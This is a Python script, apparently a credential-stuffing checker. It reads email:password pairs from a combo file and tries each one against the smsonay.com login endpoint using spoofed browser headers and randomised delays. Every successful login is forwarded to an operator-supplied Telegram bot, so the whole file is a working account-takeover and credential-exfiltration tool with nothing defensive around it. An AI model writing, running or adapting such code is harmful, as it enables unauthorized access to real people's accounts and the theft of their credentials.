import requests
import time
import random
import json
import os
from cfonts import render

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

token = input(" - Token Gir: ")
id = input(" - İd Gir: ")
EnartCombo = input(" - Combo gir: ")
os.system('clear')

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55)

header1 = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
            }

header = {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.smsonay.com',
                    'Referer': 'https://www.smsonay.com/login',
                }


with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            mail, pas = line.strip().split(':')

            session = requests.Session()  
            session.get('https://www.smsonay.com', headers=header1)

            data = {
                'email': mail,
                'password': pas,
            }
            response = session.post(
                'https://www.smsonay.com/ajax/login',
                headers=header,
                data=data
            )
            try:
                json = response.json()
                if json.get('success') is True:
                    print(f"Başarılı giriş ✅ {mail}:{pas}")
                    mesaj = f"- Smsonay Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                    gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                    msj = {
                    "chat_id": id,
                    "text": mesaj
                    }
                    requests.post(gonder, data=msj)
                    print("━" * 55) 
                else:
                    print(f"Başarısız giriş ❌ {mail}:{pas}")
                    print("━" * 55) 
                    
            except json.JSONDecodeError:
                print(f"Hata: {response.text}")

            time.sleep(random.uniform(2, 3))

        except Exception as e:
            print(f"Hata: {e}")
